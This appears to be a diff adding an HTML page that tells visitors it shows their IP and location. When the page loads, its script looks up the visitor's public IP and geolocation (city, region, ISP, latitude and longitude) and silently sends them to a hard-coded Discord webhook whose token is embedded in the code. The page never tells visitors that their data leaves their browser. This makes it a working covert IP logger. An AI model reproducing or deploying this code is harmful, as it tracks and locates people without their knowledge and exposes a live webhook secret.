@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP & Geolocation Tracker</title>
+</head>
+<body>
+    <h2>Your IP and Location</h2>
+    <pre id="output">Fetching...</pre>
+
+    <script>
+        async function fetchIPData() {
+            try {
+                // Get Public IP
+                let ipResponse = await fetch("https://api64.ipify.org?format=json");
+                let ipData = await ipResponse.json();
+                let ip = ipData.ip;
+
+                // Get Geolocation Data
+                let geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                let geoData = await geoResponse.json();
+
+                // Prepare Data
+                let data = {
+                    ip: ip,
+                    city: geoData.city,
+                    region: geoData.regionName,
+                    country: geoData.country,
+                    isp: geoData.isp,
+                    lat: geoData.lat,
+                    lon: geoData.lon
+                };
+
+                // Display Data
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+
+                // Send Data to Webhook (Replace with your webhook URL)
+                let webhookUrl = "https://discordapp.com/api/webhooks/1348733422851461170/Ejz-fNQrQFxtqQ_8Tq3EiVBLDz84omtzuLiDUNqaY53z1f80haoib3vFfFjWZfKQz2EK";
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+
+            } catch (error) {
+                document.getElementById("output").innerText = "Error fetching data.";
+                console.error("Error:", error);
+            }
+        }
+
+        fetchIPData();
+    </script>
+</body>
+</html>
